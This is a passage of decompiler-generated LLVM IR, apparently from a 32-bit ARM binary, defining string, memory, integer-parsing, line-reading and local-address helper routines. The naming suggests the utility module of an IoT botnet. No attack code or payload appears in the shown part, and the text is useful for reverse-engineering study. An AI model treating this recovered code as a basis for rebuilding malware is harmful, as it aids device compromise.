  %v0_10038 = load i32, i32* @sb, align 4
  %v1_10038 = trunc i32 %v0_10038 to i16
  store i16 %v1_10038, i16* bitcast (i32* @global_var_244dc.335 to i16*), align 4
  %v0_1003c = call i32 @malloc()
  %v4_1004c = call i32 @util_memcpy(i32 %v0_1003c, i32 ptrtoint ([24 x i8]* @global_var_19154.337 to i32), i32 23)
  store i32 %v0_1003c, i32* @global_var_244e0.338, align 4
  store i16 23, i16* bitcast (i32* @global_var_244e4.339 to i16*), align 4
  store i32 %v3_fc44, i32* @r4, align 4
  store i32 %v6_fc44, i32* @r5, align 4
  store i32 %v9_fc44, i32* @r6, align 4
  store i32 %v12_fc44, i32* @r7, align 4
  store i32 %v15_fc44, i32* @r8, align 4
  store i32 %v18_fc44, i32* @sb, align 4
  store i32 %v21_fc44, i32* @sl, align 4
  store i32 %v24_fc44, i32* @fp, align 4
  ret i32 %v4_1004c

; uselistorder directives
  uselistorder i32 %v0_1001c, { 1, 0 }
  uselistorder i32 %v0_fffc, { 1, 0 }
  uselistorder i32 %v0_ffdc, { 1, 0 }
  uselistorder i32 %v0_ff98, { 1, 0 }
  uselistorder i32 %v0_ff0c, { 1, 0 }
  uselistorder i32 %v0_feec, { 1, 0 }
  uselistorder i32 %v0_fecc, { 1, 0 }
  uselistorder i32 %v0_fea8, { 1, 0 }
  uselistorder i32 %v0_fe64, { 1, 0 }
  uselistorder i32 %v0_fdfc, { 1, 0 }
  uselistorder i32 %v0_fd04, { 1, 0 }
  uselistorder i32 %v0_fce4, { 1, 0 }
  uselistorder i32 %v0_fcbc, { 1, 0 }
  uselistorder i32 %v0_fc78, { 1, 0 }
  uselistorder i32 %v0_fc50, { 1, 0 }
  uselistorder i32 23, { 0, 4, 1, 2, 3 }
  uselistorder i32 29, { 0, 3, 4, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 7, 6, 5, 4, 13, 12, 11, 10, 9, 8, 2, 1, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_24400.213 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_100e8 = load i8, i8* %arg1, align 1
  %v2_100ec = icmp eq i8 %v3_100e8, 0
  %v0_100f0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_100ec, i32 %v0_100f0)
  br label %dec_label_pc_100f8

dec_label_pc_100f8:                               ; preds = %dec_label_pc_100f8, %entry
  %v0_100f8 = phi i32 [ %v1_100f8, %dec_label_pc_100f8 ], [ 0, %entry ]
  %v1_100f8 = add i32 %v0_100f8, 1
  %v2_100fc = add i32 %v1_100f8, %tmp
  %v3_100fc = inttoptr i32 %v2_100fc to i8*
  %v4_100fc = load i8, i8* %v3_100fc, align 1
  %v6_100fc = zext i8 %v4_100fc to i32
  store i32 %v6_100fc, i32* @r3, align 4
  %v2_10100 = icmp eq i8 %v4_100fc, 0
  br i1 %v2_10100, label %dec_label_pc_10108, label %dec_label_pc_100f8

dec_label_pc_10108:                               ; preds = %dec_label_pc_100f8
  ret i32 %v1_100f8
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v2_1010c = load i8, i8* %arg1, align 1
  %v3_1010c = zext i8 %v2_1010c to i32
  store i32 %v3_1010c, i32* @r2, align 4
  %v2_10110 = icmp eq i8 %v2_1010c, 0
  br i1 %v2_10110, label %bb, label %dec_label_pc_1011c

bb:                                               ; preds = %entry
  store i32 %v3_1010c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10130

dec_label_pc_1011c:                               ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10120

dec_label_pc_10120:                               ; preds = %dec_label_pc_10120, %dec_label_pc_1011c
  %v0_10120 = phi i32 [ %v1_10120, %dec_label_pc_10120 ], [ 0, %dec_label_pc_1011c ]
  %v1_10120 = add i32 %v0_10120, 1
  store i32 %v1_10120, i32* %ip.global-to-local, align 4
  %v2_10124 = add i32 %v1_10120, %tmp
  %v3_10124 = inttoptr i32 %v2_10124 to i8*
  %v4_10124 = load i8, i8* %v3_10124, align 1
  %v2_10128 = icmp eq i8 %v4_10124, 0
  br i1 %v2_10128, label %dec_label_pc_10130, label %dec_label_pc_10120

dec_label_pc_10130:                               ; preds = %dec_label_pc_10120, %bb
  %v0_10130 = phi i32 [ %v3_1010c, %bb ], [ %v1_10120, %dec_label_pc_10120 ]
  br label %dec_label_pc_1013c

dec_label_pc_10138:                               ; preds = %dec_label_pc_1013c
  %v0_10138 = load i32, i32* @r1, align 4
  %v1_10138 = add i32 %v0_10138, 1
  %v2_10138 = inttoptr i32 %v1_10138 to i8*
  %v3_10138 = load i8, i8* %v2_10138, align 1
  %v4_10138 = zext i8 %v3_10138 to i32
  store i32 %v4_10138, i32* @r2, align 4
  store i32 %v1_10138, i32* @r1, align 4
  %v0_1013c.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_1013c

dec_label_pc_1013c:                               ; preds = %dec_label_pc_10130, %dec_label_pc_10138
  %v0_10144.off0 = phi i8 [ %v2_1010c, %dec_label_pc_10130 ], [ %v3_10138, %dec_label_pc_10138 ]
  %v0_1013c = phi i32 [ %v0_10130, %dec_label_pc_10130 ], [ %v0_1013c.pr, %dec_label_pc_10138 ]
  %v1_1013c = add i32 %v0_1013c, -1
  store i32 %v1_1013c, i32* @r3, align 4
  %v3_10140 = icmp eq i32 %v0_1013c, 0
  %v2_10144 = load i32, i32* @r0, align 4
  %v3_10144 = inttoptr i32 %v2_10144 to i8*
  store i8 %v0_10144.off0, i8* %v3_10144, align 1
  %v4_10144 = load i32, i32* @r0, align 4
  %v5_10144 = add i32 %v4_10144, 1
  store i32 %v5_10144, i32* @r0, align 4
  br i1 %v3_10140, label %dec_label_pc_1014c, label %dec_label_pc_10138

dec_label_pc_1014c:                               ; preds = %dec_label_pc_1013c
  %v0_1014c = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_1014c

; uselistorder directives
  uselistorder i32 %v0_1013c, { 1, 0 }
  uselistorder i32 %v1_10120, { 0, 1, 3, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1013c, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_10154 = icmp eq i32 %arg3, 0
  %v0_10158 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10154, i32 %v0_10158)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10160

dec_label_pc_10160:                               ; preds = %dec_label_pc_10160, %entry
  %v0_10160 = phi i32 [ %v1_10168, %dec_label_pc_10160 ], [ 0, %entry ]
  %v2_10160 = add i32 %v0_10160, %arg2
  %v3_10160 = inttoptr i32 %v2_10160 to i8*
  %v4_10160 = load i8, i8* %v3_10160, align 1
  %v4_10164 = add i32 %v0_10160, %arg1
  %v5_10164 = inttoptr i32 %v4_10164 to i8*
  store i8 %v4_10160, i8* %v5_10164, align 1
  %v0_10168 = load i32, i32* %ip.global-to-local, align 4
  %v1_10168 = add i32 %v0_10168, 1
  store i32 %v1_10168, i32* %ip.global-to-local, align 4
  %v9_1016c = icmp eq i32 %v1_10168, %arg3
  br i1 %v9_1016c, label %dec_label_pc_10174, label %dec_label_pc_10160

dec_label_pc_10174:                               ; preds = %dec_label_pc_10160
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10168, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v0_10178 = load i32, i32* @r1, align 4
  %v2_10178 = icmp eq i32 %v0_10178, 0
  %v0_1017c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10178, i32 %v0_1017c)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10184

dec_label_pc_10184:                               ; preds = %dec_label_pc_10184, %entry
  %v2_10188 = phi i32 [ %v1_1018c, %dec_label_pc_10184 ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v3_10188 = load i32, i32* @r0, align 4
  %v4_10188 = add i32 %v3_10188, %v2_10188
  %v5_10188 = inttoptr i32 %v4_10188 to i8*
  store i8 0, i8* %v5_10188, align 1
  %v0_1018c = load i32, i32* %r2.global-to-local, align 4
  %v1_1018c = add i32 %v0_1018c, 1
  store i32 %v1_1018c, i32* %r2.global-to-local, align 4
  %v1_10190 = load i32, i32* @r1, align 4
  %v9_10190 = icmp eq i32 %v1_1018c, %v1_10190
  br i1 %v9_10190, label %dec_label_pc_10198, label %dec_label_pc_10184

dec_label_pc_10198:                               ; preds = %dec_label_pc_10184
  %v1_10198 = load i32, i32* @r0, align 4
  ret i32 %v1_10198

; uselistorder directives
  uselistorder i32 %v1_1018c, { 1, 2, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_101b0 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_101b0, label %dec_label_pc_101b8, label %dec_label_pc_101c0

dec_label_pc_101b8:                               ; preds = %dec_label_pc_101d4, %dec_label_pc_101c0, %entry, %dec_label_pc_10200
  %storemerge = phi i32 [ %v1_10200, %dec_label_pc_10200 ], [ -1, %entry ], [ -1, %dec_label_pc_101c0 ], [ -1, %dec_label_pc_101d4 ]
  ret i32 %storemerge

dec_label_pc_101c0:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_101b8, label %dec_label_pc_101c8

dec_label_pc_101c8:                               ; preds = %dec_label_pc_101c0
  br label %dec_label_pc_101e0

dec_label_pc_101d4:                               ; preds = %bb, %dec_label_pc_101f4
  %v1_101e03 = phi i32 [ %v1_101f4, %dec_label_pc_101f4 ], [ 0, %bb ]
  %v1_101d4 = add i32 %v0_10200, 1
  %v9_101d8 = icmp eq i32 %v1_101d4, %arg2
  br i1 %v9_101d8, label %dec_label_pc_101b8, label %dec_label_pc_101e0

dec_label_pc_101e0:                               ; preds = %dec_label_pc_101d4, %dec_label_pc_101c8
  %v0_10200 = phi i32 [ %v1_101d4, %dec_label_pc_101d4 ], [ 0, %dec_label_pc_101c8 ]
  %v1_101e0 = phi i32 [ %v1_101e03, %dec_label_pc_101d4 ], [ 0, %dec_label_pc_101c8 ]
  %v2_101e0 = add i32 %v1_101e0, %arg3
  %v3_101e0 = inttoptr i32 %v2_101e0 to i8*
  %v4_101e0 = load i8, i8* %v3_101e0, align 1
  %v2_101e4 = add i32 %v0_10200, %arg1
  %v3_101e4 = inttoptr i32 %v2_101e4 to i8*
  %v4_101e4 = load i8, i8* %v3_101e4, align 1
  %v9_101e8 = icmp eq i8 %v4_101e4, %v4_101e0
  br i1 %v9_101e8, label %dec_label_pc_101f4, label %bb

bb:                                               ; preds = %dec_label_pc_101e0
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_101d4

dec_label_pc_101f4:                               ; preds = %dec_label_pc_101e0
  %v1_101f4 = add i32 %v1_101e0, 1
  store i32 %v1_101f4, i32* @ip, align 4
  %v9_101f8 = icmp eq i32 %v1_101f4, %arg4
  br i1 %v9_101f8, label %dec_label_pc_10200, label %dec_label_pc_101d4

dec_label_pc_10200:                               ; preds = %dec_label_pc_101f4
  %v1_10200 = add i32 %v0_10200, 1
  br label %dec_label_pc_101b8

; uselistorder directives
  uselistorder i32 %v1_101f4, { 1, 2, 0 }
  uselistorder i32 %v1_101e0, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_101d4, { 1, 0 }
  uselistorder label %dec_label_pc_101b8, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_10218

dec_label_pc_10218:                               ; preds = %.thread, %dec_label_pc_1022c, %bb, %entry
  %v0_10218 = phi i32 [ %tmp, %entry ], [ %v5_10218, %bb ], [ %v5_10218, %dec_label_pc_1022c ], [ %v5_10218, %.thread ]
  %v1_10218 = inttoptr i32 %v0_10218 to i8*
  %v2_10218 = load i8, i8* %v1_10218, align 1
  %v5_10218 = add i32 %v0_10218, 1
  %v7_1021c = icmp eq i8 %v2_10218, 9
  br i1 %v7_1021c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10218
  br label %dec_label_pc_10218

bb:                                               ; preds = %dec_label_pc_10218
  %v8_10220 = icmp eq i8 %v2_10218, 32
  br i1 %v8_10220, label %dec_label_pc_10218, label %dec_label_pc_1022c

dec_label_pc_1022c:                               ; preds = %bb
  %v7_1022c = icmp eq i8 %v2_10218, 10
  br i1 %v7_1022c, label %dec_label_pc_10218, label %dec_label_pc_10234

dec_label_pc_10234:                               ; preds = %dec_label_pc_1022c
  %v7_10234 = icmp eq i8 %v2_10218, 45
  br i1 %v7_10234, label %dec_label_pc_10324, label %dec_label_pc_1023c

dec_label_pc_1023c:                               ; preds = %dec_label_pc_10234
  %v7_1023c = icmp eq i8 %v2_10218, 43
  br i1 %v7_1023c, label %bb54, label %dec_label_pc_1024c

bb54:                                             ; preds = %dec_label_pc_1023c
  %v2_10240 = inttoptr i32 %v5_10218 to i8*
  %v3_10240 = load i8, i8* %v2_10240, align 1
  %v6_10240 = add i32 %v0_10218, 2
  br label %dec_label_pc_1024c

dec_label_pc_1024c:                               ; preds = %bb54, %dec_label_pc_1023c, %dec_label_pc_10324
  %v1_102f439 = phi i32 [ %v5_10324, %dec_label_pc_10324 ], [ %v5_10218, %dec_label_pc_1023c ], [ %v6_10240, %bb54 ]
  %v0_1027410.in = phi i8 [ %v2_10324, %dec_label_pc_10324 ], [ %v2_10218, %dec_label_pc_1023c ], [ %v3_10240, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_10324 ], [ 2147483647, %dec_label_pc_1023c ], [ 2147483647, %bb54 ]
  %v0_10334 = phi i32 [ 1, %dec_label_pc_10324 ], [ 0, %dec_label_pc_1023c ], [ 0, %bb54 ]
  %v2_10254 = udiv i32 %storemerge1, %arg2
  %v3_10254 = urem i32 %storemerge1, %arg2
  br label %dec_label_pc_10274.outer

dec_label_pc_10274.outer:                         ; preds = %.thread5, %dec_label_pc_1024c
  %v1_102f4.ph = phi i32 [ %v6_102f4, %.thread5 ], [ %v1_102f439, %dec_label_pc_1024c ]
  %v2_102f0.ph = phi i32 [ %v5_102f0, %.thread5 ], [ 0, %dec_label_pc_1024c ]
  %v1_102b4.ph.in = phi i8 [ %v3_102f4, %.thread5 ], [ %v0_1027410.in, %dec_label_pc_1024c ]
  %v1_102cc.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_1024c ]
  %v3_102c0 = icmp uge i32 %v2_102f0.ph, %v2_10254
  %v9_102c0 = icmp eq i32 %v2_102f0.ph, %v2_10254
  %v2_102c4 = xor i1 %v3_102c0, true
  %v3_102c4 = or i1 %v9_102c0, %v2_102c4
  %v2_102c8 = xor i1 %v9_102c0, true
  %v3_102c8 = and i1 %v3_102c0, %v2_102c8
  %v2_102e8 = icmp eq i1 %v9_102c0, false
  br label %dec_label_pc_10274

dec_label_pc_10274:                               ; preds = %dec_label_pc_10274.outer, %dec_label_pc_102fc
  %v1_102f4 = phi i32 [ %v5_102fc, %dec_label_pc_102fc ], [ %v1_102f4.ph, %dec_label_pc_10274.outer ]
  %v1_102cc = phi i32 [ -1, %dec_label_pc_102fc ], [ %v1_102cc.ph, %dec_label_pc_10274.outer ]
  %v1_102b4.in = phi i8 [ %v2_102fc, %dec_label_pc_102fc ], [ %v1_102b4.ph.in, %dec_label_pc_10274.outer ]
  %v1_102b4 = zext i8 %v1_102b4.in to i32
  %v1_10274 = urem i32 %v1_102b4, 256
  %v1_10278 = add nsw i32 %v1_10274, -48
  %v1_10280 = add nsw i32 %v1_10274, -97
  %v1_10284 = add nsw i32 %v1_102b4, -48
  %v1_10288 = add nsw i32 %v1_10274, -65
  %tmp87 = icmp ult i32 %v1_10278, 10
  br i1 %tmp87, label %dec_label_pc_102b8, label %dec_label_pc_10290

dec_label_pc_10290:                               ; preds = %dec_label_pc_10274
  %v2_10290 = icmp ugt i32 %v1_10288, 24
  %v7_10290 = icmp eq i32 %v1_10288, 25
  %v2_10294 = xor i1 %v7_10290, true
  %v3_10294 = and i1 %v2_10290, %v2_10294
  br i1 %v3_10294, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_10290
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_10290, %bb55
  %v0_102a815 = phi i32 [ %v1_10284, %dec_label_pc_10290 ], [ 0, %bb55 ]
  %v2_10298 = xor i1 %v2_10290, true
  %v3_10298 = or i1 %v7_10290, %v2_10298
  br i1 %v3_10298, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_102a8 = phi i32 [ %v0_102a815, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_10294, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_102a0 = icmp ugt i32 %v1_10280, 24
  %v11_102a0 = icmp eq i32 %v1_10280, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_102a4 = phi i1 [ %v7_10290, %bb58 ], [ %v11_102a0, %bb59 ]
  %v0_102a4 = phi i1 [ %v2_10290, %bb58 ], [ %v6_102a0, %bb59 ]
  %v2_102a4 = xor i1 %v1_102a4, true
  %v3_102a4 = and i1 %v0_102a4, %v2_102a4
  br i1 %v3_102a4, label %dec_label_pc_10308, label %dec_label_pc_102a8

dec_label_pc_102a8:                               ; preds = %bb60
  %v2_102a8 = icmp eq i32 %v0_102a8, 0
  %. = select i1 %v2_102a8, i32 87, i32 55
  %v2_102b4 = sub nsw i32 %v1_102b4, %.
  br label %dec_label_pc_102b8

dec_label_pc_102b8:                               ; preds = %dec_label_pc_10274, %dec_label_pc_102a8
  %v0_102cc33 = phi i32 [ %v1_10288, %dec_label_pc_10274 ], [ %., %dec_label_pc_102a8 ]
  %v3_102f0 = phi i32 [ %v1_10284, %dec_label_pc_10274 ], [ %v2_102b4, %dec_label_pc_102a8 ]
  %v2_102b8 = sub i32 %v3_102f0, %arg2
  %v4_102b8 = xor i32 %v3_102f0, %arg2
  %v5_102b8 = xor i32 %v2_102b8, %v3_102f0
  %v6_102b8 = and i32 %v5_102b8, %v4_102b8
  %v7_102b8 = icmp slt i32 %v6_102b8, 0
  %v8_102b8 = icmp slt i32 %v2_102b8, 0
  %v2_102bc = xor i1 %v8_102b8, %v7_102b8
  br i1 %v2_102bc, label %dec_label_pc_102c0, label %dec_label_pc_10308

dec_label_pc_102c0:                               ; preds = %dec_label_pc_102b8
  br i1 %v3_102c4, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_102c0
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_102c0, %bb63
  %v0_102cc32 = phi i32 [ %v0_102cc33, %dec_label_pc_102c0 ], [ 0, %bb63 ]
  br i1 %v3_102c8, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_102cc = phi i32 [ %v0_102cc32, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_102cc, 0
  %v4_102cc = zext i1 %tmp88 to i32
  %v5_102cc = or i32 %v0_102cc, %v4_102cc
  %v7_102cc = icmp eq i32 %v5_102cc, 0
  br i1 %v7_102cc, label %dec_label_pc_102d4, label %dec_label_pc_102fc

dec_label_pc_102d4:                               ; preds = %bb66
  %v2_102e0 = sub i32 %v3_102f0, %v3_10254
  %v4_102e0 = xor i32 %v3_102f0, %v3_10254
  %v5_102e0 = xor i32 %v2_102e0, %v3_102f0
  %v6_102e0 = and i32 %v5_102e0, %v4_102e0
  %v7_102e0 = icmp slt i32 %v6_102e0, 0
  %v8_102e0 = icmp slt i32 %v2_102e0, 0
  %v9_102e0 = icmp eq i32 %v3_102f0, %v3_10254
  %v3_102e4 = xor i1 %v8_102e0, %v7_102e0
  %v4_102e4 = or i1 %v9_102e0, %v3_102e4
  br i1 %v4_102e4, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_102d4
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_102d4
  br i1 %v2_102e8, label %.thread5, label %dec_label_pc_102fc

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_102f0 = mul i32 %v2_102f0.ph, %arg2
  %v5_102f0 = add i32 %v3_102f0, %v4_102f0
  %v2_102f4 = inttoptr i32 %v1_102f4 to i8*
  %v3_102f4 = load i8, i8* %v2_102f4, align 1
  %v6_102f4 = add i32 %v1_102f4, 1
  br label %dec_label_pc_10274.outer

dec_label_pc_102fc:                               ; preds = %thread-pre-split, %bb66
  %v1_102fc = inttoptr i32 %v1_102f4 to i8*
  %v2_102fc = load i8, i8* %v1_102fc, align 1
  %v5_102fc = add i32 %v1_102f4, 1
  br label %dec_label_pc_10274

dec_label_pc_10308:                               ; preds = %dec_label_pc_102b8, %bb60
  %v1_10308 = icmp slt i32 %v1_102cc, 0
  %v2_10334 = icmp eq i32 %v0_10334, 0
  br i1 %v1_10308, label %dec_label_pc_10334, label %dec_label_pc_10310

dec_label_pc_10310:                               ; preds = %dec_label_pc_10308
  br i1 %v2_10334, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_10310
  %v2_10314 = sub i32 0, %v2_102f0.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_10310, %bb69
  %v1_10320 = phi i32 [ -2147483648, %bb71 ], [ %v2_102f0.ph, %dec_label_pc_10310 ], [ %v2_10314, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_10320

dec_label_pc_10324:                               ; preds = %dec_label_pc_10234
  %v1_10324 = inttoptr i32 %v5_10218 to i8*
  %v2_10324 = load i8, i8* %v1_10324, align 1
  %v5_10324 = add i32 %v0_10218, 2
  br label %dec_label_pc_1024c

dec_label_pc_10334:                               ; preds = %dec_label_pc_10308
  br i1 %v2_10334, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_10334
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_10334
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_10334, { 1, 0 }
  uselistorder i32 %v2_102e0, { 1, 0 }
  uselistorder i32 %v2_102b8, { 1, 0 }
  uselistorder i32 %v3_102f0, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_10290, { 1, 2, 0 }
  uselistorder i1 %v2_10290, { 1, 0, 2 }
  uselistorder i32 %v1_10274, { 1, 2, 0 }
  uselistorder i32 %v1_102b4, { 1, 0, 2 }
  uselistorder i32 %v1_102cc, { 1, 0 }
  uselistorder i32 %v1_102f4, { 2, 3, 1, 0 }
  uselistorder i1 %v9_102c0, { 1, 0, 2 }
  uselistorder i1 %v3_102c0, { 1, 0 }
  uselistorder i32 %v2_102f0.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_10254, { 1, 0, 2 }
  uselistorder i32 %v2_10254, { 1, 0 }
  uselistorder i32 %v5_10218, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_10218, { 0, 1, 3, 2 }
  uselistorder i32 25, { 20, 21, 5, 12, 2, 11, 3, 13, 4, 14, 10, 6, 15, 0, 16, 7, 8, 17, 9, 18, 1, 19 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 0, 1, 13, 2, 3, 4, 5, 6, 7 }
  uselistorder i8 9, { 2, 0, 1 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_102b8, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_10274, { 1, 0 }
  uselistorder label %dec_label_pc_1024c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10218, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10344 = load i32, i32* @r4, align 4
  store i32 %v3_10344, i32* %stack_var_-24, align 4
  %v6_10344 = load i32, i32* @r5, align 4
  %v9_10344 = load i32, i32* @r6, align 4
  %v12_10344 = load i32, i32* @r7, align 4
  %v15_10344 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1035c

dec_label_pc_1035c:                               ; preds = %dec_label_pc_10380.dec_label_pc_1035c_crit_edge, %entry
  %v0_10360 = phi i32 [ %v0_10360.pre, %dec_label_pc_10380.dec_label_pc_1035c_crit_edge ], [ %arg3, %entry ]
  %v0_1035c = phi i32 [ %v5_10380, %dec_label_pc_10380.dec_label_pc_1035c_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_1035c, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_10368 = call i32 @__libc_read(i32 %v0_10360)
  %v7_1036c = icmp eq i32 %v1_10368, 1
  %v0_10374 = load i32, i32* @r5, align 4
  br i1 %v7_1036c, label %dec_label_pc_10374, label %dec_label_pc_1038c

dec_label_pc_10374:                               ; preds = %dec_label_pc_1035c
  %v1_10374 = add i32 %v0_10374, 1
  store i32 %v1_10374, i32* @r5, align 4
  %v1_10378 = load i32, i32* @r8, align 4
  %v6_1037c = icmp slt i32 %v1_10374, %v1_10378
  br i1 %v6_1037c, label %dec_label_pc_10380, label %.loopexit

dec_label_pc_10380:                               ; preds = %dec_label_pc_10374
  %v0_10380 = load i32, i32* @r4, align 4
  %v1_10380 = inttoptr i32 %v0_10380 to i8*
  %v2_10380 = load i8, i8* %v1_10380, align 1
  %v3_10380 = zext i8 %v2_10380 to i32
  store i32 %v3_10380, i32* @r3, align 4
  %v5_10380 = add i32 %v0_10380, 1
  store i32 %v5_10380, i32* @r4, align 4
  %v7_10384 = icmp eq i8 %v2_10380, 10
  br i1 %v7_10384, label %dec_label_pc_1038c, label %dec_label_pc_10380.dec_label_pc_1035c_crit_edge

dec_label_pc_10380.dec_label_pc_1035c_crit_edge:  ; preds = %dec_label_pc_10380
  %v0_10360.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1035c

dec_label_pc_1038c:                               ; preds = %dec_label_pc_1035c, %dec_label_pc_10380
  %v0_1038c = phi i32 [ %v1_10374, %dec_label_pc_10380 ], [ %v0_10374, %dec_label_pc_1035c ]
  %v2_1038c = icmp eq i32 %v0_1038c, 0
  br i1 %v2_1038c, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_1038c
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_10374, %dec_label_pc_1038c, %bb
  %v0_10394 = load i32, i32* @r7, align 4
  %v2_10398 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10398, i32* @r4, align 4
  store i32 %v6_10344, i32* @r5, align 4
  store i32 %v9_10344, i32* @r6, align 4
  store i32 %v12_10344, i32* @r7, align 4
  store i32 %v15_10344, i32* @r8, align 4
  ret i32 %v0_10394

; uselistorder directives
  uselistorder i32 %v5_10380, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1038c, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_103a0 = load i32, i32* @r4, align 4
  %v6_103a0 = load i32, i32* @r5, align 4
  %v9_103a0 = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_103b0 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_103b8 = inttoptr i32 %v0_103b0 to i32*
  store i32 0, i32* %v2_103b8, align 4
  %v0_103c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_103c8 = call i32 @socket(i32 2, i32 2, i32 %v0_103c4)
  %v7_103cc = icmp eq i32 %v3_103c8, -1
  store i32 %v3_103c8, i32* @r5, align 4
  br i1 %v7_103cc, label %bb, label %dec_label_pc_103dc

bb:                                               ; preds = %entry
  %v1_103d4 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10428

dec_label_pc_103dc:                               ; preds = %entry
  %v2_103e8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_103e8, i32* @r4, align 4
  %v0_103f4 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_10408 = call i32 @__libc_connect(i32 %v3_103c8, i32 %v2_103e8, i32 %v0_103f4)
  store i32 %v2_103e8, i32* @r1, align 4
